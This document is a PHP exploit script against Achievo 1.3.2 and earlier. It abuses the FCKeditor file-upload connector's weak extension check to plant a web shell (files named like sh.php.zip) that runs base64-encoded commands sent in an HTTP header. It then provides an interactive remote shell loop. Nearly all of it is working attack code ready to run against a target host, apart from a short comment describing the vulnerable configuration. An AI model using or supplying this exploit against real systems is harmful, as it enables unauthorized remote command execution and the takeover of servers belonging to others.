&lt;?php

/*
	-----------------------------------------------------------------
	Achievo &lt;= 1.3.2 (fckeditor) Remote Arbitrary File Upload Exploit
	-----------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.achievo.org/
	details..: works only with a specific server configuration (e.g. an Apache server with the mod_mime module installed)
	
	[-] vulnerable code in /atk/attributes/fck/editor/filemanager/browser/mcpuk/connectors/php/config.php
	
	121.	//File Area
	122.	$fckphp_config[&#039;ResourceAreas&#039;][&#039;File&#039;] =array(
	123.		
	124.		//Files(identified by extension) that may be uploaded to this area
	125.		&#039;AllowedExtensions&#039;	=&gt;	array(&quot;zip&quot;,&quot;doc&quot;,&quot;xls&quot;,&quot;pdf&quot;,&quot;rtf&quot;,&quot;csv&quot;,&quot;jpg&quot;,&quot;gif&quot;,&quot;jpeg&quot;,&quot;png&quot;,&quot;avi&quot;,&quot;mpg&quot;,&quot;mpeg&quot;,&quot;swf&quot;,&quot;fla&quot;),
	
	with a default configuration of this script, an attacker might be able to upload arbitrary
	files containing malicious PHP code due to multiple file extensions isn&#039;t properly checked
*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...&quot;;
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function upload()
{
	global $host, $path;
	
	$connector = &quot;atk/attributes/fck/editor/filemanager/browser/mcpuk/connectors/php/connector.php&quot;;
	$file_ext  = array(&quot;zip&quot;, &quot;swf&quot;, &quot;fla&quot;, &quot;doc&quot;, &quot;xls&quot;, &quot;rtf&quot;, &quot;csv&quot;);
	
	foreach ($file_ext as $ext)
	{
		print &quot;\n[-] Trying to upload with .{$ext} extension...&quot;;
		
		$data  = &quot;--12345\r\n&quot;;
		$data .= &quot;Content-Disposition: form-data; name=\&quot;NewFile\&quot;; filename=\&quot;sh.php.{$ext}\&quot;\r\n&quot;;
		$data .= &quot;Content-Type: application/octet-stream\r\n\r\n&quot;;
		$data .= &quot;&lt;?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?&gt;\r\n&quot;;
		$data .= &quot;--12345--\r\n&quot;;
		
		$packet  = &quot;POST {$path}{$connector}?Command=FileUpload&amp;CurrentFolder={$path} HTTP/1.0\r\n&quot;;
		$packet .= &quot;Host: {$host}\r\n&quot;;
		$packet .= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
		$packet .= &quot;Content-Type: multipart/form-data; boundary=12345\r\n&quot;;
		$packet .= &quot;Connection: close\r\n\r\n&quot;;
		$packet .= $data;
		
		preg_match(&quot;/OnUploadCompleted\((.*),&#039;(.*)&#039;\)/i&quot;, http_send($host, $packet), $html);
		
		if (!in_array(intval($html[1]), array(0, 201))) die(&quot;\n[-] Upload failed! (Error {$html[1]}: {$html[2]})\n&quot;);
		
		$packet  = &quot;GET {$path}sh.php.{$ext} HTTP/1.0\r\n&quot;;
		$packet .= &quot;Host: {$host}\r\n&quot;;
		$packet .= &quot;Connection: close\r\n\r\n&quot;;
		$html    = http_send($host, $packet);
		
		if (!eregi(&quot;print&quot;, $html) and eregi(&quot;_code_&quot;, $html)) return $ext;
		
		sleep(1);
	}
	
	return false;
}

print &quot;\n+--------------------------------------------------------------------+&quot;;
print &quot;\n| Achievo &lt;= 1.3.2 (fckeditor) Arbitrary File Upload Exploit by EgiX |&quot;;
print &quot;\n+--------------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......: php $argv[0] host path\n&quot;;
	print &quot;\nExample....: php $argv[0] localhost /&quot;;
	print &quot;\nExample....: php $argv[0] localhost /achievo/\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];

if (!($ext = upload())) die(&quot;\n\n[-] Exploit failed...\n&quot;);
else print &quot;\n[-] Shell uploaded...starting it!\n&quot;;

define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));

while(1)
{
	print &quot;\nachievo-shell# &quot;;
	$cmd = trim(fgets(STDIN));
	if ($cmd != &quot;exit&quot;)
	{
		$packet = &quot;GET {$path}sh.php.{$ext} HTTP/1.0\r\n&quot;;
		$packet.= &quot;Host: {$host}\r\n&quot;;
		$packet.= &quot;Cmd: &quot;.base64_encode($cmd).&quot;\r\n&quot;;
		$packet.= &quot;Connection: close\r\n\r\n&quot;;
		$html   = http_send($host, $packet);
		if (!eregi(&quot;_code_&quot;, $html)) die(&quot;\n[-] Exploit failed...\n&quot;);
		$shell = explode(&quot;_code_&quot;, $html);
		print &quot;\n{$shell[1]}&quot;;
	}
	else break;
}

?&gt;

